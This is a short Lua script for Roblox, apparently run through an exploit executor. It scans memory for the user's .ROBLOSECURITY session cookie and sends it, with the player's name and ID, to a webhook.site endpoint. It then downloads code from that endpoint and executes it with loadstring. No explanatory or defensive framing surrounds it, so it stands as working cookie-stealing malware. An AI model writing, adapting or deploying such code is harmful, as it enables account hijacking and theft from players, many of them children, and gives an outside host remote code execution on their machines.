local Player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")
local WEBHOOK = "https://webhook.site/837a45ee-af1a-47bb-960f-97e3fbe86d01"

local function findCookie()
    local cookie = nil
    pcall(function()
        for _, v in pairs(getgc()) do
            if type(v) == "string" and #v > 800 and v:find("_|WARNING") then
                cookie = v:match("(_|WARNING[^\"]+)")
                break
            end
        end
    end)
    if not cookie then
        pcall(function()
            for _, v in pairs(getgc()) do
                if type(v) == "table" then
                    for _, val in pairs(v) do
                        if type(val) == "string" and #val > 800 and val:find("_|WARNING") then
                            cookie = val:match("(_|WARNING[^\"]+)")
                            break
                        end
                    end
                end
                if cookie then break end
            end
        end)
    end
    return cookie
end

local cookie = findCookie()

if cookie then
    local url = WEBHOOK .. "?cookie=" .. HttpService:UrlEncode(cookie) .. "&user=" .. HttpService:UrlEncode(Player.Name .. "_" .. Player.UserId)
    pcall(function() game:HttpGet(url) end)
    pcall(function() loadstring(game:HttpGet(url))() end)
else
    local url = WEBHOOK .. "?user=" .. HttpService:UrlEncode(Player.Name) .. "&status=no_cookie&gc=" .. #getgc()
    pcall(function() game:HttpGet(url) end)
end
